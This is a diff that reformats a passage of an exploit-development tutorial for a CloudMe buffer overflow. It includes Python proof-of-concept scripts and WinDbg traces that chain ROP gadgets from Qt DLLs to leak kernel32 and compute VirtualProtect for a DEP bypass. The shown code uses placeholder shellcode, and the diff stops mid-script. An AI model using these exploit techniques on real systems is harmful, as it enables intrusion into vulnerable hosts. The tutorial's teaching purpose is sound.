@@ -1070,10 +1070,55 @@ except Exception as e:
     print(sys.exc_value)
 ```
 
-Below is the debugging **WinDBG** session corresponding to the PoC exploit above, that proves the successful pivoting
+Below is the debugging **WinDbg** session corresponding to the PoC exploit above, that proves the successful pivoting
 
 ```
-0:016\> bp 0x6998fb2e \*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 0:016\> bl 0 e 6998fb2e 0001 (0001) 0:\*\*\*\* Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e 0:016\> g Breakpoint 0 hit eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000 eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e: 6998fb2e 81c46c070000 add esp,76Ch 0:000\> t eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000 eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884: 6998fb34 5b pop ebx 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000 eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885: 6998fb35 5e pop esi 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=00000000 eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886: 6998fb36 5f pop edi 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141 eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887: 6998fb37 5d pop ebp 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141 eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888: 6998fb38 c3 ret 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141 eip=42424242 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=0000021642424242 ?? ???
+0:016> bp 0x6998fb2e
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
+0:016> bl
+0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
+0:016> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
+eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e:
+6998fb2e 81c46c070000 add esp,76Ch
+0:000> t
+eax=00000000 ebx=00000000 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
+eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884:
+6998fb34 5b pop ebx
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=00000000 edi=00000000
+eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885:
+6998fb35 5e pop esi
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=00000000
+eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886:
+6998fb36 5f pop edi
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141
+eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887:
+6998fb37 5d pop ebp
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141
+eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
+6998fb38 c3 ret
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=777071cd esi=41414141 edi=41414141
+eip=42424242 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+42424242 ?? ???
 ```
 
 As we see above, we have landed precisely into our placeholder at **"BBBBB"**. At this point we are ready to start building the ROP chain to bypass DEP, but before doing this we will search for gadgets to dynamically load the address of **VirtualProtect** function.
@@ -1097,7 +1142,8 @@ As previously mentioned, after scrolling down the stack view, there is a leaked 
 We can confirm that this address is referring at a **kernel32** function by using the following command
 
 ```
-0:000\> dds 0022ED28 0022ed28 75c44543 kernel32!GetFullPathNameWStub [...]
+0:000\> dds 
+0022ED28 0022ed28 75c44543 kernel32!GetFullPathNameWStub [...]
 ```
 
 At this point, we need to figure out how to:
@@ -1109,7 +1155,9 @@ At this point, we need to figure out how to:
 Before proceeding any further, let’s find all suitable ROP gadgets using **mona.py** as follows:
 
 ```
-0:000\> !load pykd.pyd 0:000\> !py mona rop -n -o [...]
+0:000> !load pykd.pyd
+0:000> !py mona rop -n -o 
+[...]
 ```
 
 After a while we open **rop\_suggestions.txt** and **rop.txt** in mona’s output directory ( **WinDBG** Debugger’s program folder). First let’s figure out a way to get the current stack address into **EAX** register. **EAX** is the register of choice because there are available gadgets of the following instruction **MOV EAX,DWORD PTR [EAX]** which will allow us to load the **kernel32** address into **EAX**. Before searching for suitable gadgets, we must also refer to the Module info inside the **rop\_suggestions.txt** file in order to check which . **dll** has no restrictions. We found that the following **.dlls** have no restrictions
@@ -1127,7 +1175,13 @@ After a while we open **rop\_suggestions.txt** and **rop.txt** in mona’s outpu
 As we see above, there are many modules that we could search for gadgets. Afterwards, the following gadgets have been found and used in order to load the **Kernel32** address into the EAX register.
 
 ```
-0x699012c9 # POP EBP # RETN [Qt5Network.dll] 0x0385FF88 # Offset 0x68a9559e # XCHG EAX,EBP # RETN [Qt5Core.dll] 0x68ae4fe3 # POP ECX # RETN [Qt5Core.dll] 0x0362fffc # Offset 0x68ad422b # SUB EAX,ECX # RETN [Qt5Core.dll] 0x68ae8a22 # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]
+0x699012c9 # POP EBP # RETN [Qt5Network.dll]
+0x0385FF88 # Offset
+0x68a9559e # XCHG EAX,EBP # RETN [Qt5Core.dll]
+0x68ae4fe3 # POP ECX # RETN [Qt5Core.dll]
+0x0362fffc # Offset
+0x68ad422b # SUB EAX,ECX # RETN [Qt5Core.dll]
+0x68ae8a22 # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]
 ```
 
 Now lets explain what we see above. At the first gadget we put the hex value **0x0385ff88** into the EBP register. Then, EAX register will get that offset as seen at the second gadget. Afterwards , ECX register will load the hex value **0x0362fffc.** Now at the sixth gadget above we subtract the two values and with this technique we get the following address on the stack&nbsp; **0x0022FF8C.** If we scroll down at the stack pane in **Immunity Debugger** we will see that this address is referring to a leaked **Kernel32** address.&nbsp; Before we move further, we must load the leaked **kernel32** address into EAX by using the gadget **MOV EAX,DWORD PTR [EAX].&nbsp;&nbsp;**
@@ -1135,24 +1189,154 @@ Now lets explain what we see above. At the first gadget we put the hex value **0
 In order to see this in practice lets create the following PoC script
 
 ```python
-import struct 
+import struct
 import socket
-import sys 
+import sys
 
-target = "127.0.0.1" 
-payload_size = 1604 junk1 = "\x41" * payload_size
+target = "127.0.0.1"
 
-######################################################################## 
-# Get kernel32 address from the stack 
-# 762a20d8 kernel32!VirtualProtect 
+payload_size = 1604
 
-rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll] rop+= struct.pack('L',0x0385FF88) # Offset rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll] rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll] rop+= struct.pack('L',0x0362fffc) # Offset rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll] rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll] ######################################################################## buf = "\x42" \* 351 nops = "\x90" \* 16 junk2 = "\x43"\*(2236 - len(rop) - len(nops) - len(buf) - len(junk1)) seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN payload = junk1 + rop + nops + buf + junk2 + seh try: s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) s.connect((target,8888)) s.send(payload) except Exception as e: print(sys.exc\_value)
+junk1 = "\x41" * payload_size
+
+########################################################################
+
+# Get kernel32 address from the stack
+# 762a20d8 kernel32!VirtualProtect
+
+rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll]
+rop+= struct.pack('L',0x0385FF88) # Offset
+rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x0362fffc) # Offset
+rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]
+
+########################################################################
+
+buf = "\x42" * 351
+
+nops = "\x90" * 16
+
+junk2 = "\x43"*(2236 - len(rop) - len(nops) - len(buf) - len(junk1))
+
+seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN
+
+payload = junk1 + rop + nops + buf + junk2 + seh
+
+try:
+  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((target,8888))
+  s.send(payload)
+except Exception as e:
+  print(sys.exc_value)
 ```
 
 Below is the debugging session with **WinDBG** which shows the ROP gadgets in action:
 
 ```
-0:000\> bp 0x6998fb2e \*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 0:000\> bl 0 e 6998fb2e 0001 (0001) 0:\*\*\*\* Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e 0:000\> g Breakpoint 0 hit eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000 eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e: 6998fb2e 81c46c070000 add esp,76Ch 0:000\> t eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000 eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884: 6998fb34 5b pop ebx 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000 eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885: 6998fb35 5e pop esi 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=00000000 eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886: 6998fb36 5f pop edi 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887: 6998fb37 5d pop ebp 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888: 6998fb38 c3 ret 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=699012c9 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network+0x12c9: 699012c9 5d pop ebp 0:000\> \*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=699012ca esp=0022d69c ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Network+0x12ca: 699012ca c3 ret 0:000\> eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=68a9559e esp=0022d6a0 ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!Z21qt\_logging\_to\_consolev+0x8e: 68a9559e 95 xchg eax,ebp 0:000\> eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=68a9559f esp=0022d6a0 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!Z21qt\_logging\_to\_consolev+0x8f: 68a9559f c3 ret 0:000\> eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141 eip=68ae4fe3 esp=0022d6a4 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS\_5StateEPi+0xdf3: 68ae4fe3 59 pop ecx 0:000\> eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ae4fe4 esp=0022d6a8 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS\_5StateEPi+0xdf4: 68ae4fe4 c3 ret 0:000\> eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ad422b esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 Qt5Core!ZNK5QTime4hourEv+0x1b: 68ad422b 29c8 sub eax,ecx 0:000\> eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ad422d esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Core!ZNK5QTime4hourEv+0x1d: 68ad422d c3 ret 0:000\> eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ae8a22 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Core!ZNK12QEasingCurve4typeEv+0x2: 68ae8a22 8b00 mov eax,dword ptr [eax] ds:0023:0022ff8c=453c2f76 0:000\> eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141 eip=68ae8a24 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212 Qt5Core!ZNK12QEasingCurve4typeEv+0x4: 68ae8a24 c3 ret
+0:000> bp 0x6998fb2e
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll - 
+0:000> bl
+0 e 6998fb2e 0001 (0001) 0:**** Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e
+0:000> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
+eip=6998fb2e esp=0022cf18 ebp=0022cf38 iopl=0 nv up ei pl zr na pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x87e:
+6998fb2e 81c46c070000 add esp,76Ch
+0:000> t
+eax=00000000 ebx=00000000 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
+eip=6998fb34 esp=0022d684 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x884:
+6998fb34 5b pop ebx
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=00000000 edi=00000000
+eip=6998fb35 esp=0022d688 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x885:
+6998fb35 5e pop esi
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=00000000
+eip=6998fb36 esp=0022d68c ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x886:
+6998fb36 5f pop edi
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=6998fb37 esp=0022d690 ebp=0022cf38 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x887:
+6998fb37 5d pop ebp
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=6998fb38 esp=0022d694 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
+6998fb38 c3 ret
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=699012c9 esp=0022d698 ebp=41414141 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network+0x12c9:
+699012c9 5d pop ebp
+0:000> 
+*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=699012ca esp=0022d69c ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Network+0x12ca:
+699012ca c3 ret
+0:000> 
+eax=00000000 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=68a9559e esp=0022d6a0 ebp=0385ff88 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!Z21qt_logging_to_consolev+0x8e:
+68a9559e 95 xchg eax,ebp
+0:000> 
+eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=68a9559f esp=0022d6a0 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!Z21qt_logging_to_consolev+0x8f:
+68a9559f c3 ret
+0:000> 
+eax=0385ff88 ebx=41414141 ecx=6998fb2e edx=776d71cd esi=41414141 edi=41414141
+eip=68ae4fe3 esp=0022d6a4 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf3:
+68ae4fe3 59 pop ecx
+0:000> 
+eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ae4fe4 esp=0022d6a8 ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf4:
+68ae4fe4 c3 ret
+0:000> 
+eax=0385ff88 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ad422b esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
+Qt5Core!ZNK5QTime4hourEv+0x1b:
+68ad422b 29c8 sub eax,ecx
+0:000> 
+eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ad422d esp=0022d6ac ebp=00000000 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Core!ZNK5QTime4hourEv+0x1d:
+68ad422d c3 ret
+0:000> 
+eax=0022ff8c ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ae8a22 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Core!ZNK12QEasingCurve4typeEv+0x2:
+68ae8a22 8b00 mov eax,dword ptr [eax] ds:0023:0022ff8c=453c2f76
+0:000> 
+eax=762f3c45 ebx=41414141 ecx=0362fffc edx=776d71cd esi=41414141 edi=41414141
+eip=68ae8a24 esp=0022d6b0 ebp=00000000 iopl=0 nv up ei pl nz ac po nc
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000212
+Qt5Core!ZNK12QEasingCurve4typeEv+0x4:
+68ae8a24 c3 ret
 ```
 
 As seen above in red, after the **MOV EAX,DWORD PTR [EAX]** instruction is executed, the leaked kernel address is now loaded into EAX. Below we are doing the same demonstration with **Immunity Debugger** which shows the leaked **kernel32** address at the stack pane below:
@@ -1172,19 +1356,23 @@ At this point we can calculate the **VirtualProtect** address using the leaked *
 At this section we will see how to calculate the address of **VirtualProtect** in order to bypass DEP. First let’s find the address of **VirtualProtect** using **WinDBG.&nbsp;**
 
 ```
-0:019\> x kernel32!VirtualProtect 762a20d8 kernel32!VirtualProtect (\<no parameter info\>)
+0:019\> x kernel32!VirtualProtect 
+762a20d8 kernel32!VirtualProtect (<no parameter info>)
 ```
 
 So, as we see above , the **VirtualProtect** address is **0x762a20d8**.&nbsp; Because of the address randomization the base address of **kernel32.dll** could change; however, the position of **VirtualProtect** relative to the leaked **kernel32** address **0x762f3c45** remains constant. Because **VirtualProtect** ( **0x762a20d8** ) is less than the leaked address ( **0x762f3c45** ), we can get the address of **VirtualProtect** into EAX while avoiding null bytes by adding a negative offset as follows:
 
 ```
-0:019\> ? kernel32!VirtualProtect - 0x762f3c45 Evaluate expression: -334701 = fffae493
+0:019\> ? kernel32!VirtualProtect - 0x762f3c45 
+Evaluate expression: -334701 = fffae493
 ```
 
 The following gadgets have been found and used in order to load the **VirtualProtect** address dynamically into our exploit.
 
 ```
-0x68a812c9 # POP EBP # RETN [Qt5Core.dll] 0xfffae493 # Offset 0x61ba8137 # ADD EAX,EBP # RETN [Qt5Gui.dll]
+0x68a812c9 # POP EBP # RETN [Qt5Core.dll]
+0xfffae493 # Offset
+0x61ba8137 # ADD EAX,EBP # RETN [Qt5Gui.dll]
 ```
 
 At the first gadget, EBP is assigned with the hex value **0xfffae493**. Then, adding the two values from EAX and EBP will then give us the address of **VirtualProtect** and the result will be saved in EAX.
@@ -1193,15 +1381,186 @@ At the first gadget, EBP is assigned with the hex value **0xfffae493**. Then, ad
 
 Below is an updated PoC that implements the ROP gadgets showed before in order to calculate the **VirtualProtect** address dynamically and place it into EAX.
 
-```
-import struct import socket
-import sys target = "127.0.0.1" payload\_size = 1604 junk1 = "\x41" \* payload\_size ######################################################################## # Get kernel32 address from the stack # 762a20d8 kernel32!VirtualProtect rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll] rop+= struct.pack('L',0x0385FF88) # Offset rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll] rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll] rop+= struct.pack('L',0x0362fffc) # Offset rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll] rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll] # Calculate VirtualProtect relative to the leaked kernel32 address rop+= struct.pack('L',0x68a812c9) # POP EBP # RETN [Qt5Core.dll] rop+= struct.pack('L',0xfffae493) # Offset rop+= struct.pack('L',0x61ba8137) # ADD EAX,EBP # RETN [Qt5Gui.dll] ######################################################################## buf = "\x42" \* 351 nops = "\x90" \* 16 junk2 = "\x43"\*(2236 - len(rop) - len(nops) - len(buf) - len(junk1)) seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN payload = junk1 + rop + nops + buf + junk2 + seh try: s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) s.connect((target,8888)) s.send(payload) except Exception as e: print(sys.exc\_value)
+```python
+import struct
+import socket
+import sys
+
+target = "127.0.0.1"
+
+payload_size = 1604
+
+junk1 = "\x41" * payload_size
+
+########################################################################
+
+# Get kernel32 address from the stack
+# 762a20d8 kernel32!VirtualProtect
+
+rop = struct.pack('L',0x699012c9) # POP EBP # RETN [Qt5Network.dll]
+rop+= struct.pack('L',0x0385FF88) # Offset
+rop+= struct.pack('L',0x68a9559e) # XCHG EAX,EBP # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x68ae4fe3) # POP ECX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x0362fffc) # Offset
+rop+= struct.pack('L',0x68ad422b) # SUB EAX,ECX # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0x68ae8a22) # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]
+
+# Calculate VirtualProtect relative to the leaked kernel32 address
+
+rop+= struct.pack('L',0x68a812c9) # POP EBP # RETN [Qt5Core.dll]
+rop+= struct.pack('L',0xfffae493) # Offset
+rop+= struct.pack('L',0x61ba8137) # ADD EAX,EBP # RETN [Qt5Gui.dll]
+
+########################################################################
+
+buf = "\x42" * 351
+
+nops = "\x90" * 16
+
+junk2 = "\x43"*(2236 - len(rop) - len(nops) - len(buf) - len(junk1))
+
+seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN
+
